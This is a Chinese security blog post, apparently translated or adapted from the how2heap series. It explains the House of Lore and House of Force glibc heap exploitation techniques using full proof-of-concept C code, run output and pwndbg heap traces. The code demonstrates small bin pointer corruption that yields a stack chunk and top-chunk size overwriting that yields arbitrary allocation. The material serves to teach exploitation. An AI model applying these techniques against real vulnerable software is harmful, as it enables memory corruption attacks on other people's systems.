# how2heap之house of lore && house of force

阅读量 **815364**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-02-24 11:30:26

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t01e0c10f1efb991b6e.jpg)

> 欢迎各位喜欢安全的小伙伴们加入星盟安全 UVEgZ3JvdXA6IDU3MDI5NTQ2MQ==
>
> 本文包含 house of lore,house of force

PS:由于本人才疏学浅,文中可能会有一些理解的不对的地方,欢迎各位斧正 🙂

## house of lore

###  序

我们的house of lore其实就是利用了small bin的机制而导致的任意地址分配,所利用的地方就是

    
    
    [ ... ]
    
    else
        {
          bck = victim->bk;
        if (__glibc_unlikely (bck->fd != victim)){
    
                      errstr = "malloc(): smallbin double linked list corrupted";
                      goto errout;
                    }
    
           set_inuse_bit_at_offset (victim, nb);
           bin->bk = bck;
           bck->fd = bin;
    
           [ ... ]
    

我们需要做的,就是将small bin的bk指针指向我们的fake
chunk,也就是控制bck,但是要注意的是bck->fd!=victim这个地方需要绕过

关于small bin在最2.29中其实还有一种攻击方法,但是这里就不再详述了

这里要注意一下的就是程序推荐在ubuntu 14.04 32位机上测试,但我是在ubuntu 16.04的64位机上测试的,所以会有一些出入,但其实问题不大

###  源代码

这里我就不删了,只加了一点注释

    
    
    /*
    Advanced exploitation of the House of Lore - Malloc Maleficarum.
    This PoC take care also of the glibc hardening of smallbin corruption.
    
    [ ... ]
    
    else
        {
          bck = victim->bk;
        if (__glibc_unlikely (bck->fd != victim)){
    
                      errstr = "malloc(): smallbin double linked list corrupted";
                      goto errout;
                    }
    
           set_inuse_bit_at_offset (victim, nb);
           bin->bk = bck;
           bck->fd = bin;
    
           [ ... ]
    
    */
    
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <stdint.h>
    
    void jackpot(){ puts("Nice jump d00d"); exit(0); }
    
    int main(int argc, char * argv[]){
    
    
      intptr_t* stack_buffer_1[4] = {0};
      intptr_t* stack_buffer_2[3] = {0};
    
      fprintf(stderr, "nWelcome to the House of Loren");
      //这个版本也可以绕过glibc malloc引入的强化检查
      fprintf(stderr, "This is a revisited version that bypass also the hardening check introduced by glibc mallocn");                                                                                                        fprintf(stderr, "This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23nn");
      //分配victim chunk(100)
      fprintf(stderr, "Allocating the victim chunkn");
      intptr_t *victim = malloc(100);
      //这时堆上的第一个small chunk
      fprintf(stderr, "Allocated the first small chunk on the heap at %pn", victim);
    
      //我们需要去掉头部大小才能得到真正的victim地址
      // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk                                                                                                         intptr_t *victim_chunk = victim-2;
    
      fprintf(stderr, "stack_buffer_1 at %pn", (void*)stack_buffer_1);
      fprintf(stderr, "stack_buffer_2 at %pn", (void*)stack_buffer_2);
    
      //在栈上创建一个fake chunk
      fprintf(stderr, "Create a fake chunk on the stackn");
      //我们把fwd指针指向victim_chunk来绕过第二个malloc到最后一个malloc上small bin corrupted的检查,这样就可以将我们的栈地址写到small bin list里了
      fprintf(stderr, "Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"
             "in second to the last malloc, which putting stack address on smallbin listn");
      stack_buffer_1[0] = 0;
      stack_buffer_1[1] = 0;
      stack_buffer_1[2] = victim_chunk;
    
      //将我们的bk指针指向stack_buffer_2并且将stack_buffer_2的fwd指针指向stack_buffer_1来绕过最后一个malloc上small bin corrupted的检查,这样就可以在栈上返回一个假的chunk
      fprintf(stderr, "Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buff                                                                                                 er_1 "
             "in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "                                                                                                               "chunk on stack");
      stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
      stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
    
      //分配另一个large bin来避免small bin在free的时候与top chunk合并
      fprintf(stderr, "Allocating another large chunk in order to avoid consolidating the top chunk with"
             "the small one during the free()n");
      void *p5 = malloc(1000);
      fprintf(stderr, "Allocated the large chunk on the heap at %pn", p5);
    
      //free顶块,此时会将它放进unsorted bin中
      fprintf(stderr, "Freeing ttop he chunk %p, it will be inserted in the unsorted binn", victim);
      free((void*)victim);
    
      //在unsorted bin中,victim的fwd和bk指针都是0
      fprintf(stderr, "nIn the unsorted bin the victim's fwd and bk pointers are niln");
      fprintf(stderr, "victim->fwd: %pn", (void *)victim[0]);
      fprintf(stderr, "victim->bk: %pnn", (void *)victim[1]);
    
      //现在调用一个不会被unsorted bin或者small bin处理的malloc
      fprintf(stderr, "Now performing a malloc that can't be handled by the UnsortedBin, nor the small binn");
      //这也意味着chunk victim会被插入到smallbin的最前面
      fprintf(stderr, "This means that the chunk %p will be inserted in front of the SmallBinn", victim);
    
      void *p2 = malloc(1200);
      fprintf(stderr, "The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %pn", p2                                                                                                 );
      //victim chunk已经被排序并且他的fwd和bk指针也被更新了
      fprintf(stderr, "The victim chunk has been sorted and its fwd and bk pointers updatedn");
      fprintf(stderr, "victim->fwd: %pn", (void *)victim[0]);
      fprintf(stderr, "victim->bk: %pnn", (void *)victim[1]);
    
      //------------VULNERABILITY-----------      //现在假设我们有一个漏洞可以覆盖victim->bk指针
      fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointern");
    
      //victim->bk正指向栈上
      victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack 
    
      //------------------------------------      //现在我们分配一个和我们第一次free大小一样的chunk
      fprintf(stderr, "Now allocating a chunk with size equal to the first one freedn");
      //这个操作将会给我们返回已经被覆写的victim chunk并且将bin->bk指向被注入的victim->bk指针
      fprintf(stderr, "This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointern");
    
      void *p3 = malloc(100);
    
      //这个最后一次的malloc将欺骗glibc malloc返回一个在bin->bk中被注入的chunk
      fprintf(stderr, "This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bkn");
      char *p4 = malloc(100);
      fprintf(stderr, "p4 = malloc(100)n");
      //而stack_buffer_2的fwd指针也在最后一次的malloc中被修改了
      fprintf(stderr, "nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %pn",
             stack_buffer_2[2]);
    
      fprintf(stderr, "np4 is %p and should be on the stack!n", p4); // this chunk will be allocated on stack
      intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
      memcpy((p4+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
    }
    

###  运行结果

    
    
    Welcome to the House of Lore
    This is a revisited version that bypass also the hardening check introduced by glibc malloc
    This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23
    
    Allocating the victim chunk
    Allocated the first small chunk on the heap at 0x81c010
    stack_buffer_1 at 0x7ffeea058c50
    stack_buffer_2 at 0x7ffeea058c30
    Create a fake chunk on the stack
    Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corruptedin second to the last malloc, which putting stack address on smallbin list
    Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake chunk on stackAllocating another large chunk in order to avoid consolidating the top chunk withthe small one during the free()
    Allocated the large chunk on the heap at 0x81c080
    Freeing the chunk 0x81c010, it will be inserted in the unsorted bin
    
    In the unsorted bin the victim's fwd and bk pointers are nil
    victim->fwd: (nil)
    victim->bk: (nil)
    
    Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin
    This means that the chunk 0x81c010 will be inserted in front of the SmallBin
    The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to 0x81c470
    The victim chunk has been sorted and its fwd and bk pointers updated
    victim->fwd: 0x7f5b68740bd8
    victim->bk: 0x7f5b68740bd8
    
    Now emulating a vulnerability that can overwrite the victim->bk pointer
    Now allocating a chunk with size equal to the first one freed
    This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer
    This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk
    p4 = malloc(100)
    
    The fwd pointer of stack_buffer_2 has changed after the last malloc to 0x7f5b68740bd8
    
    p4 is 0x7ffeea058c60 and should be on the stack!
    Nice jump d00d
    

###  关键代码调试

断点如下:

    
    
       42   intptr_t *victim = malloc(100);
     ► 43   fprintf(stderr, "Allocated the first small chunk on the heap at %pn", victim);
    
       54   stack_buffer_1[0] = 0;
       55   stack_buffer_1[1] = 0;
       56   stack_buffer_1[2] = victim_chunk;
       57
     ► 58   fprintf(stderr, "Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "
    
       61   stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
       62   stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
       63
     ► 64   fprintf(stderr, "Allocating another large chunk in order to avoid consolidating the top chunk with"
    
       66   void *p5 = malloc(1000);
     ► 67   fprintf(stderr, "Allocated the large chunk on the heap at %pn", p5);
    
       71   free((void*)victim);
       72
     ► 73   fprintf(stderr, "nIn the unsorted bin the victim's fwd and bk pointers are niln");
    
       80   void *p2 = malloc(1200);
     ► 81   fprintf(stderr, "The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %pn", p2);
    
        91   victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack
        92
        93   //------------------------------------        94
     ►  95   fprintf(stderr, "Now allocating a chunk with size equal to the first one freedn");
    
        98   void *p3 = malloc(100);
        99
       100
     ► 101   fprintf(stderr, "This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bkn");
    
        102   char *p4 = malloc(100);
     ► 103   fprintf(stderr, "p4 = malloc(100)n");
    
       109   intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
       110   memcpy((p4+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
     ► 111 }
    

下面直接运行,首先是malloc 了victim

    
    
    pwndbg> heap
    0x603000 FASTBIN {
      prev_size = 0,
      size = 113,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603070 PREV_INUSE {
      prev_size = 0,
      size = 135057,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    pwndbg> p stack_buffer_1
    $1 = {0x0, 0x0, 0x0, 0x0}
    pwndbg> p stack_buffer_2
    $2 = {0x0, 0x0, 0x0}
    pwndbg> p &stack_buffer_1
    $3 = (intptr_t *(*)[4]) 0x7fffffffe620
    pwndbg> p &stack_buffer_2
    $4 = (intptr_t *(*)[3]) 0x7fffffffe600
    

然后程序修改了stack_buffer_1的值

    
    
    pwndbg> p stack_buffer_1
    $5 = {0x0, 0x0, 0x603000, 0x0}
    //我们所伪造的stack_buffer_1
    $6 = {
      prev_size = 0,
      size = 0,
      fd = 0x603000,
      bk = 0x0,
      fd_nextsize = 0x7fffffffe730,
      bk_nextsize = 0x2f7024547d2ca600
    }
    

第二次修改

    
    
    $7 = {
      prev_size = 0,
      size = 0,
      fd = 0x603000,
      bk = 0x7fffffffe600,
      fd_nextsize = 0x7fffffffe730,
      bk_nextsize = 0x2f7024547d2ca600
    }
    pwndbg> p stack_buffer_1
    $8 = {0x0, 0x0, 0x603000, 0x7fffffffe600}
    

现在分配了p5来避免free victim的时候被合并到top chunk中

    
    
    pwndbg> heap
    0x603000 FASTBIN {
      prev_size = 0,
      size = 113,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603070 PREV_INUSE {
      prev_size = 0,
      size = 1009,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603460 PREV_INUSE {
      prev_size = 0,
      size = 134049,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    

紧接着free掉了victim，此时我们的victim被放进了fast bin中

为什么是fast bin而不是程序中所说的unsorted bin这里我说一下，程序原本希望在32位机上测试的，但我的机子是64位的，100的chunk <
max_fast(128)所以被放进了fastbin中，但如果是32位机子的话，100>max_fast(64)因此被放入了unsorted bin中 )

    
    
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x603000 ◂— 0x0
    0x80: 0x0
    unsortedbin
    all: 0x0
    smallbins
    empty
    largebins
    empty
    

现在就需要我们分配一个既不是unsorted bin又不是small bin的chunk了，一个超大的chunk会从top
chunk里分一块出来，然后系统会把unsorted bin中的chunk塞入属于他的bins中

    
    
    pwndbg> heap
    0x603000 FASTBIN {
      prev_size = 0,
      size = 113,
      fd = 0x7ffff7dd1bd8 <main_arena+184>,
      bk = 0x7ffff7dd1bd8 <main_arena+184>,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603070 {
      prev_size = 112,
      size = 1008,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603460 PREV_INUSE {
      prev_size = 0,
      size = 1217,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603920 PREV_INUSE {
      prev_size = 0,
      size = 132833,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x0
    smallbins
    0x70: 0x603000 —▸ 0x7ffff7dd1bd8 (main_arena+184) ◂— 0x603000
    largebins
    empty
    

可以看到我们的victim已经被放到了small bins中，那么对为什么victim不在unsorted bin中却在small
bin中不了解的同学建议还是去看glibc内存管理的机制，这里我简单说一下

如果是32位机子会直接从unsorted bin中被扔进small bins，但是64位多了几个步骤

因为我们分配了1200的大内存，ptmalloc会先从fastbin中找，然后依次在unsorted bin,small
bin中查找看看有没有符合的chunk，因为我们没有符合的chunk，所以ptmalloc会把fastbin的chunk合并，然后放到unsorted
bin中，再从unsorted bin中查找，发现还是不符合，就会把unsorted
bin中的chunk放入属于他的bins中，此时我们的victim就被放进了small bin中了

好了，现在我们的victim已经被放到small bin中了，现在我们更改victim的bk指针指针，让他指向栈上

    
    
    pwndbg> x/10gx 0x603000
    0x603000:       0x0000000000000000      0x0000000000000071
    0x603010:       0x00007ffff7dd1bd8      0x00007fffffffe620
    0x603020:       0x0000000000000000      0x0000000000000000
    0x603030:       0x0000000000000000      0x0000000000000000
    0x603040:       0x0000000000000000      0x0000000000000000
    pwndbg> p &stack_buffer_1
    $10 = (intptr_t *(*)[4]) 0x7fffffffe620
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x0
    smallbins
    0x70 [corrupted]
    FD: 0x603000 —▸ 0x7ffff7dd1bd8 (main_arena+184) ◂— 0x603000
    BK: 0x603000 —▸ 0x7fffffffe620 —▸ 0x7fffffffe600 —▸ 0x400c4d (__libc_csu_init+77) ◂— nop
    largebins
    empty
    

可以看到我们已经伪造成功了，bk指针已经指到了我们的栈上

现在我们再申请一个victim一样大小的chunk,因为small bin是FIFO,所以头会被取出

    
    
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x0
    smallbins
    0x70 [corrupted]
    FD: 0x603000 —▸ 0x7ffff7dd1bd8 (main_arena+184) ◂— 0x603000
    BK: 0x7fffffffe620 —▸ 0x7fffffffe600 —▸ 0x400c4d (__libc_csu_init+77) ◂— nop
    largebins
    empty
    

现在我们再申请一个chunk就可以取到栈上的chunk了

    
    
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x0
    smallbins
    0x70 [corrupted]
    FD: 0x603000 —▸ 0x7ffff7dd1bd8 (main_arena+184) ◂— 0x603000
    BK: 0x7fffffffe600 —▸ 0x400c4d (__libc_csu_init+77) ◂— nop
    largebins
    empty
    

###  总结

程序首先在栈上定义了两个变量,stack_buffer_1[4],stack_buffer_2[3]

随后在栈上创建了一个fake chunk,将stack_buffer_1的fwd指针指向了victim_chunk

随后将stack_buffere_1的bk指针指向了stack_buffer_2,将stack_buffer_2的fwd指针指向了stack_buffer_1来绕过检查

之后为了将我们的victim放进我们的small bin中,申请一个超大的chunk

在victim被放进了small bin后,我们只需要覆盖victim的bk指针指向我们的stack_buffer_1即可

现在我们再分配一个大小为100的chunk,系统就会把victim返回给我们,但此时small bin中还有我们依旧伪造好的fake chunk

此时再分配就可以将我们的fake chunk拿出来了

## house of force

###  序

我们所说的house of force就是利用一个巨大的数来改写top chunk的size

这样就可以通过建立一个evil_size大小的chunk来使得我们的av->top指向我们想控制的地方

此时下一次分配就可以成功控制那块内存了

###  源代码

这里我也删了一些作者的话,加了一小点注释

    
    
    #include <stdio.h>
    #include <stdint.h>
    #include <stdlib.h>
    #include <string.h>
    #include <stdint.h>
    #include <malloc.h>
    
    //bss_var是我们要覆写的string
    char bss_var[] = "This is a string that we want to overwrite.";
    
    int main(int argc , char* argv[])
    {
            fprintf(stderr, "nWelcome to the House of Forcenn");
            //House of Force是覆写top chunk来分配任意内存地址的攻击方法
            fprintf(stderr, "The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.n");
            //top chunk是一个特殊的chunk,是内存中最后一块chunk,在向系统申请更多空间的情况下将会更改size的大小
            fprintf(stderr, "The top chunk is a special chunk. Is the last in memory "
                    "and is the chunk that will be resized when malloc asks for more space from the os.n");
            //在最后,我们将会使用这个方法来覆写bss_var的值
            fprintf(stderr, "nIn the end, we will use this to overwrite a variable at %p.n", bss_var);
            fprintf(stderr, "Its current value is: %sn", bss_var);
    
    
            //先分配一个chunk p1(256)
            fprintf(stderr, "nLet's allocate the first chunk, taking space from the wilderness.n");
            intptr_t *p1 = malloc(256);
            fprintf(stderr, "The chunk of 256 bytes has been allocated at %p.n", p1 - 2);
    
            //现在堆由两个chunk组成,一个是我们分配的,另一个就是top chunk
            fprintf(stderr, "nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.n");
            int real_size = malloc_usable_size(p1);
            fprintf(stderr, "Real size (aligned and all that jazz) of our allocated chunk is %ld.n", real_size + sizeof(long)*2);
    
            //现在假设我们有一个漏洞可以覆盖top chunk的大小
            fprintf(stderr, "nNow let's emulate a vulnerability that can overwrite the header of the Top Chunkn");
    
            //----- VULNERABILITY ----            intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long));
            fprintf(stderr, "nThe top chunk starts at %pn", ptr_top);
    
            //用一个超大的值来覆盖top chunk以让我们可以确保malloc永远不会调用mmap来申请空间
            fprintf(stderr, "nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.n");
    
            fprintf(stderr, "Old size of top chunk %#llxn", *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
    
            *(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;
            fprintf(stderr, "New size of top chunk %#llxn", *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
            //------------------------    
            //现在我们的top chunk的size巨大非凡,我们可以随意申请内存而不会调用mmap
            fprintf(stderr, "nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.n"
            //下面,我们将通过整数溢出分配一个直达我们所需区域的,之后就可以在我们所需区域处分配一个chunk出来
               "Next, we will allocate a chunk that will get us right up against the desired region (with an integern"
               "overflow) and will then be able to allocate a chunk right over the desired region.n");
    
            /*
            我们所需的size是这么计算的:
            nb是我们要求的size+元数据
             * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):
             * new_top = old_top + nb
             * nb = new_top - old_top
             * req + 2sizeof(long) = new_top - old_top
             * req = new_top - old_top - 2sizeof(long)
             * req = dest - 2sizeof(long) - old_top - 2sizeof(long)
             * req = dest - old_top - 4*sizeof(long)
             */
            unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;
    
    
            fprintf(stderr, "nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,n"
               "we will malloc %#lx bytes.n", bss_var, ptr_top, evil_size);
            void *new_ptr = malloc(evil_size);
            按预期,新的指针和旧的top chuk在同一位置
            fprintf(stderr, "As expected, the new pointer is at the same place as the old top chunk: %pn", new_ptr - sizeof(long)*2);
    
            void* ctr_chunk = malloc(100);
            //现在,我们覆写的下一个chunk将指向我们的目标buffer
            fprintf(stderr, "nNow, the next chunk we overwrite will point at our target buffer.n");
            fprintf(stderr, "malloc(100) => %p!n", ctr_chunk);
            //现在,我们终于可以覆写这个值啦!
            fprintf(stderr, "Now, we can finally overwrite that value:n");
    
            fprintf(stderr, "... old string: %sn", bss_var);
            fprintf(stderr, "... doing strcpy overwrite with "YEAH!!!"...n");
            strcpy(ctr_chunk, "YEAH!!!");
            fprintf(stderr, "... new string: %sn", bss_var);
    
    
            //一些进一步的总结
            // some further discussion:
            //这个被控制的malloc将会在参数为ebil_size=malloc_got_address-8-p2_gussed时被调用
            //fprintf(stderr, "This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessednn");
            //这个是因为main_arena->top指针被设为了 av->top + malloc_size,并且我们想要将这个地址设置为malloc_got_address - 8的地址
            //fprintf(stderr, "This because the main_arena->top pointer is setted to current av->top + malloc_size "
            //      "and we nwant to set this result to the address of malloc_got_address-8nn");
            //为了做这件事,我们让 malloc_got_address - 8= p2_gussed+evil_size
            //fprintf(stderr, "In order to do this we have malloc_got_address-8 = p2_guessed + evil_sizenn");
            //av->top在分配了这个大的malloc了之后将被设置为malloc_got_address -8
            //fprintf(stderr, "The av->top after this big malloc will be setted in this way to malloc_got_address-8nn");
            //再调用一次新的malloc的时候将返回av->top+8并且返回一个在(malloc_got_address-8)+8=malloc_got_address的chunk
            //fprintf(stderr, "After that a new call to malloc will return av->top+8 ( +8 bytes for the header ),"
            //      "nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_addressnn");
    
            //fprintf(stderr, "The large chunk with evil_size has been allocated here 0x%08xn",p2);
    
            //fprintf(stderr, "The main_arena value av->top has been setted to malloc_got_address-8=0x%08xn",malloc_got_address);
            //最后一次分配将会通过其余的代码提供服务并返回之前被注入的av->top +8
            //fprintf(stderr, "This last malloc will be served from the remainder code and will return the av->top+8 injected beforen");
    }
    

###  运行结果

    
    
    Welcome to the House of Force
    
    The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.
    The top chunk is a special chunk. Is the last in memory and is the chunk that will be resized when malloc asks for more space from the os.
    
    In the end, we will use this to overwrite a variable at 0x602060.
    Its current value is: This is a string that we want to overwrite.
    
    Let's allocate the first chunk, taking space from the wilderness.
    The chunk of 256 bytes has been allocated at 0x18b8000.
    
    Now the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.
    Real size (aligned and all that jazz) of our allocated chunk is 280.
    
    Now let's emulate a vulnerability that can overwrite the header of the Top Chunk
    
    The top chunk starts at 0x18b8110
    
    Overwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.
    Old size of top chunk 0x20ef1
    New size of top chunk 0xffffffffffffffff
    
    The size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.
    Next, we will allocate a chunk that will get us right up against the desired region (with an integer
    overflow) and will then be able to allocate a chunk right over the desired region.
    
    The value we want to write to at 0x602060, and the top chunk is at 0x18b8110, so accounting for the header size,
    we will malloc 0xfffffffffed49f30 bytes.
    As expected, the new pointer is at the same place as the old top chunk: 0x18b8110
    
    Now, the next chunk we overwrite will point at our target buffer.
    malloc(100) => 0x602060!
    Now, we can finally overwrite that value:
    ... old string: This is a string that we want to overwrite.
    ... doing strcpy overwrite with "YEAH!!!"...
    ... new string: YEAH!!!
    

###  调试

因为较为简单,只下了几个断点

    
    
       35   intptr_t *p1 = malloc(256);
     ► 36   fprintf(stderr, "The chunk of 256 bytes has been allocated at %p.n", p1 - 2);
    
       50   *(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;
     ► 51   fprintf(stderr, "New size of top chunk %#llxn", *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
    
       67   unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;
     ► 68   fprintf(stderr, "nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,n"
    
       70   void *new_ptr = malloc(evil_size);
     ► 71   fprintf(stderr, "As expected, the new pointer is at the same place as the old top chunk: %pn", new_ptr - sizeof(long)*2);
    
       73   void* ctr_chunk = malloc(100);
     ► 74   fprintf(stderr, "nNow, the next chunk we overwrite will point at our target buffer.n");
    

首先我们申请chunk p1(256),此时

    
    
    pwndbg> heap
    0x603000 PREV_INUSE {
      prev_size = 0,
      size = 273,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603110 PREV_INUSE {
      prev_size = 0,
      size = 134897,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    

可以看到我们的top chunk起始地址为0x63110而size为134897

之后我们将top chunk的size设为-1,也就是0xffffffffffffffff

    
    
    pwndbg> x/10gx 0x603110
    0x603110:       0x0000000000000000      0xffffffffffffffff
    0x603120:       0x0000000000000000      0x0000000000000000
    0x603130:       0x0000000000000000      0x0000000000000000
    0x603140:       0x0000000000000000      0x0000000000000000
    0x603150:       0x0000000000000000      0x0000000000000000
    

此时因为top chunk 的size巨大,因此无论我们申请多少的空间,他都不会再调用mmap了

现在我们计算一下evil_size的大小

evil_size=bss_var-0x20-ptr_top

    
    
    pwndbg> p/x evil_size
    $7 = 0xffffffffffffef30
    

之后申请一个evil_size大小的chunk

    
    
    pwndbg> heap
    0x603000 PREV_INUSE {
      prev_size = 0,
      size = 273,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603110 PREV_INUSE {
      prev_size = 0,
      size = 18446744073709547329,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x602050 PREV_INUSE {
      prev_size = 0,
      size = 4281,
      fd = 0x2073692073696854,
      bk = 0x676e697274732061,
      fd_nextsize = 0x6577207461687420,
      bk_nextsize = 0x6f7420746e617720
    }
    0x603108 {
      prev_size = 0,
      size = 0,
      fd = 0xffffffffffffef41,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    

现在我们新申请的chunk是从之前的top chunk起始的

此时如果我们再申请一个chunk就可以拿到我们想要申请的地址了

    
    
    pwndbg> heap
    0x603000 PREV_INUSE {
      prev_size = 0,
      size = 273,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603110 PREV_INUSE {
      prev_size = 0,
      size = 18446744073709547329,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x602050 FASTBIN {
      prev_size = 0,
      size = 113,
      fd = 0x2073692073696854,
      bk = 0x676e697274732061,
      fd_nextsize = 0x6577207461687420,
      bk_nextsize = 0x6f7420746e617720
    }
    0x6020c0 PREV_INUSE {
      prev_size = 0,
      size = 4169,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603108 {
      prev_size = 0,
      size = 0,
      fd = 0xffffffffffffef41,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    

## 总结

程序首先建立了一个全局变量bss_var,也就是我们需要攻击的地方

随后分配了chunk p1(256),现在我们的top chunk的size是一个比较小的值

因此我们假设有一个漏洞可以覆写top chunk的size,我们通过写入-1来使size变为一个巨大的数(0xffffffffffffffff)

此时无论我们再申请多大的空间,ptmalloc都不会再向系统申请调用mmap了(当然..如果把0xfffffffffffffff的空间都用完了还是会申请的

现在我们计算出了evil_size所需的值,也就是

evil_size=(bss_var-16)-(ptr_top)-16

此时我们先申请一个大小为evil_size的chunk,此时新指针和旧的top chunk在同一位置,而size正好是旧top
chunk到我们bss_var的差值

此时我们再申请一块chunk就可以获得我们想控制的var_bss了

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **知世** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/197831](/post/id/197831)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)

 **+1** __4赞

 __收藏

![](https://p3.ssl.qhimg.com/t01b60c9bd9051ba29f.png) 知世

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

